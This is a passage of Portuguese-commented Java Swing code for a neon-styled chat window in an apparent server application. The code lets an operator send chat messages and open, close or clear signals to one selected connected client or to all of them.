                this.trackColor = new Color(14, 16, 22);
            }
        });

        // === RODAPÉ (input + botões) ===
        JPanel bottomPanel = new JPanel(new BorderLayout());
        bottomPanel.setBorder(javax.swing.BorderFactory.createEmptyBorder(10, 10, 10, 10));
        bottomPanel.setOpaque(false);

        CHAT_FIELD = new JTextField();
        CHAT_FIELD.setFont(new Font("Consolas", Font.PLAIN, 13));
        CHAT_FIELD.setForeground(new Color(230, 255, 250));
        CHAT_FIELD.setBackground(new Color(20, 22, 30));
        CHAT_FIELD.setBorder(javax.swing.BorderFactory.createCompoundBorder(
                javax.swing.BorderFactory.createLineBorder(new Color(40, 255, 200, 90), 1, true),
                javax.swing.BorderFactory.createEmptyBorder(8, 10, 8, 10)
        ));
        // Placeholder simples
        final String hint = "Digite sua mensagem e pressione Enter…";
        CHAT_FIELD.putClientProperty("JTextField.placeholderText", hint); // alguns LAFs suportam
        CHAT_FIELD.addFocusListener(new java.awt.event.FocusAdapter() {
            @Override
            public void focusGained(java.awt.event.FocusEvent e) {
                CHAT_FIELD.repaint();
            }

            @Override
            public void focusLost(java.awt.event.FocusEvent e) {
                CHAT_FIELD.repaint();
            }
        });

        JButton sendButton = neonButton("Enviar");
        JButton openChatButton = ghostButton("Abrir");
        JButton clearChatButton = ghostButton("Limpar");
        JButton closeChatButton = ghostButton("Fechar");

        ActionListener sendAction = event -> {
            String msg = CHAT_FIELD.getText().trim();
            if (!msg.isEmpty()) {
                send("chat " + msg);
                if (msg.equalsIgnoreCase(">")) {
                    addMessage("< CHAT DO USUÁRIO ABERTO >");
                } else if (msg.equalsIgnoreCase(">>")) {
                    addMessage("< CHAT DO USUÁRIO FECHADO >");
                } else if (msg.equalsIgnoreCase("clear")) {
                    addMessage("< CHAT DO USUÁRIO LIMPO >");
                } else {
                    addMessage("Você: " + msg);
                }
                CHAT_FIELD.setText("");
            }
        };
        sendButton.addActionListener(sendAction);
        CHAT_FIELD.addActionListener(sendAction); // Enter envia

        openChatButton.addActionListener(event -> {
            addMessage("< CHAT DO USUÁRIO ABERTO >");
            send("chat >");
        });
        closeChatButton.addActionListener(event -> {
            addMessage("< CHAT DO USUÁRIO FECHADO >");
            send("chat >>");
        });
        clearChatButton.addActionListener(event -> {
            addMessage("< CHAT DO USUÁRIO LIMPO >");
            send("chat clear");
        });

        JPanel buttonsPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 0));
        buttonsPanel.setOpaque(false);
        buttonsPanel.add(sendButton);
        buttonsPanel.add(openChatButton);
        buttonsPanel.add(clearChatButton);
        buttonsPanel.add(closeChatButton);

        bottomPanel.add(CHAT_FIELD, BorderLayout.CENTER);
        bottomPanel.add(buttonsPanel, BorderLayout.EAST);

        // === CONTEÚDO PRINCIPAL ===
        JPanel center = new NeonGradientPanel(new Color(12, 14, 20), new Color(8, 10, 16));
        center.setLayout(new BorderLayout(10, 10));
        center.setBorder(javax.swing.BorderFactory.createEmptyBorder(10, 10, 10, 10));
        center.add(scrollPane, BorderLayout.CENTER);
        center.add(bottomPanel, BorderLayout.SOUTH);

        // === ROOT ===
        JPanel root = new JPanel(new BorderLayout());
        root.setBackground(new Color(10, 12, 18));
        root.add(header, BorderLayout.NORTH);
        root.add(center, BorderLayout.CENTER);

        CHAT_FRAME.setLayout(new BorderLayout());
        CHAT_FRAME.add(root, BorderLayout.CENTER);

        // Hotkeys: ESC fecha, Ctrl+Enter envia, Ctrl+L limpa local
        javax.swing.InputMap im = CHAT_FRAME.getRootPane().getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW);
        javax.swing.ActionMap am = CHAT_FRAME.getRootPane().getActionMap();
        im.put(KeyStroke.getKeyStroke(KeyEvent.VK_ESCAPE, 0), "closeWin");
        am.put("closeWin", new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                CHAT_FRAME.dispose();
            }
        });
        im.put(KeyStroke.getKeyStroke(KeyEvent.VK_ENTER, InputEvent.CTRL_DOWN_MASK), "sendMsg");
        am.put("sendMsg", new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                sendAction.actionPerformed(null);
            }
        });
        im.put(KeyStroke.getKeyStroke(KeyEvent.VK_L, InputEvent.CTRL_DOWN_MASK), "clearLocal");
        am.put("clearLocal", new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                CHAT_TEXT.setText("");
                CHAT_MESSAGES.clear();
            }
        });

        // Recarrega LAF
        if (ServerGUI.DARK_MODE) SwingUtilities.updateComponentTreeUI(CHAT_FRAME);

        // Carrega histórico já existente
        updateTextArea();

        CHAT_FRAME.setVisible(true);
    }

    public void addMessage(String message) {
        ConnectServer.msg((message.startsWith(getClientInfo() + ": ") ? "" : getClientInfo() + ": ") + message);
        CHAT_MESSAGES.add(message);
        updateTextArea();
    }

    public void updateTextArea() {
        CHAT_TEXT.setText("");
        for (String m : CHAT_MESSAGES) {
            CHAT_TEXT.append(m + "\n");
        }

        CHAT_TEXT.setCaretPosition(CHAT_TEXT.getDocument().getLength());
    }

    public static void handleChat(String input) {
        if (ConnectServer.SELECTED_CLIENT == -1) {
            if (ConnectServer.CLIENTS.isEmpty()) {
                ConnectServer.msg("Não possui nenhum cliente conectado no momento!");
            } else {
                if (input.equalsIgnoreCase("<")) {
                    for (ClientHandler clientHandler : new ArrayList<>(ConnectServer.CLIENTS.values())) {
                        clientHandler.showChat(null);
                    }
                } else {
                    if (input.equalsIgnoreCase(">")) {
                        ConnectServer.msg("Abrindo o chat para " + ConnectServer.CLIENTS.size() + " clientes!");
                        for (ClientHandler clientHandler : new ArrayList<>(ConnectServer.CLIENTS.values())) {
                            clientHandler.showChat("< CHAT DO USUÁRIO ABERTO >");
                            clientHandler.send("chat >");
                        }
                    } else if (input.equalsIgnoreCase(">>")) {
                        ConnectServer.msg("Fechando o chat para " + ConnectServer.CLIENTS.size() + " clientes!");
                        for (ClientHandler clientHandler : new ArrayList<>(ConnectServer.CLIENTS.values())) {
                            clientHandler.showChat("< CHAT DO USUÁRIO FECHADO >");
                            clientHandler.send("chat >>");
                        }
                    } else if (input.equalsIgnoreCase("clear")) {
                        ConnectServer.msg("Limpando o chat para " + ConnectServer.CLIENTS.size() + " clientes!");
                        for (ClientHandler clientHandler : new ArrayList<>(ConnectServer.CLIENTS.values())) {
                            clientHandler.showChat("< CHAT DO USUÁRIO LIMPO >");
                            clientHandler.send("chat clear");
                        }
                    } else {
                        ConnectServer.msg("Enviando a mensagem via chat \"" + input + "\" para " + ConnectServer.CLIENTS.size() + " clientes!");
                        for (ClientHandler clientHandler : new ArrayList<>(ConnectServer.CLIENTS.values())) {
                            clientHandler.showChat("Você: " + input);
                            clientHandler.send("chat " + input);
                        }
                    }
                }
            }
        } else {
            ClientHandler client = ConnectServer.CLIENTS.get(ConnectServer.SELECTED_CLIENT);
            if (input.equalsIgnoreCase("<")) {
                client.showChat(null);
            } else {
                if (input.equalsIgnoreCase(">")) {
                    client.showChat("< CHAT DO USUÁRIO ABERTO >");
                } else if (input.equalsIgnoreCase(">>")) {
                    client.showChat("< CHAT DO USUÁRIO FECHADO >");
                } else if (input.equalsIgnoreCase("clear")) {
                    client.showChat("< CHAT DO USUÁRIO LIMPO >");
                } else {
                    client.showChat("Você: " + input);
                }
                client.send("chat " + input);
            }
        }
    }

    // ======== VISUAIS AUXILIARES (dentro de ClientHandler) ========
    private static Color accent() {
        return new Color(40, 255, 200);
    }

    private static Color accentSoft() {
        return new Color(40, 255, 200, 90);
    }

    private static Color baseBg() {
        return new Color(12, 14, 20);
    }

    private JButton neonButton(String text) {
        JButton b = new JButton(text);
        b.setFont(new Font("Consolas", Font.BOLD, 12));
        b.setForeground(new Color(14, 16, 20));
        b.setBackground(accent());
        b.setFocusPainted(false);
        b.setBorder(javax.swing.BorderFactory.createCompoundBorder(
                javax.swing.BorderFactory.createLineBorder(new Color(120, 255, 230), 1, true),
                javax.swing.BorderFactory.createEmptyBorder(8, 14, 8, 14)
        ));
        b.addMouseListener(new java.awt.event.MouseAdapter() {
            @Override
            public void mouseEntered(java.awt.event.MouseEvent e) {
                b.setBackground(new Color(80, 255, 225));
            }

            @Override
            public void mouseExited(java.awt.event.MouseEvent e) {
                b.setBackground(accent());
            }
        });
        return b;
    }

    private JButton ghostButton(String text) {
        JButton b = new JButton(text);
        b.setFont(new Font("Consolas", Font.BOLD, 12));
        b.setForeground(new Color(210, 255, 245));
        b.setBackground(new Color(24, 26, 34));
        b.setFocusPainted(false);
        b.setBorder(javax.swing.BorderFactory.createCompoundBorder(
                javax.swing.BorderFactory.createLineBorder(accentSoft(), 1, true),
                javax.swing.BorderFactory.createEmptyBorder(8, 14, 8, 14)
        ));
        b.addMouseListener(new java.awt.event.MouseAdapter() {
            @Override
            public void mouseEntered(java.awt.event.MouseEvent e) {
                b.setBorder(javax.swing.BorderFactory.createCompoundBorder(
                        javax.swing.BorderFactory.createLineBorder(accent(), 1, true),
                        javax.swing.BorderFactory.createEmptyBorder(8, 14, 8, 14)
                ));
            }

            @Override
            public void mouseExited(java.awt.event.MouseEvent e) {
                b.setBorder(javax.swing.BorderFactory.createCompoundBorder(
                        javax.swing.BorderFactory.createLineBorder(accentSoft(), 1, true),
                        javax.swing.BorderFactory.createEmptyBorder(8, 14, 8, 14)
                ));
            }
        });
        return b;
    }

    // Painel com degradê sutil
    private static class NeonGradientPanel extends JPanel {
        private final Color c1, c2;

        NeonGradientPanel(Color c1, Color c2) {
            this.c1 = c1;
            this.c2 = c2;
            setOpaque(false);
        }

        @Override
        protected void paintComponent(Graphics g) {
            Graphics2D g2 = (Graphics2D) g.create();
            g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
            int w = getWidth(), h = getHeight();
            GradientPaint gp = new GradientPaint(0, 0, c1, 0, h, c2);
            g2.setPaint(gp);
            g2.fillRect(0, 0, w, h);
            g2.dispose();
            super.paintComponent(g);
        }
    }

}
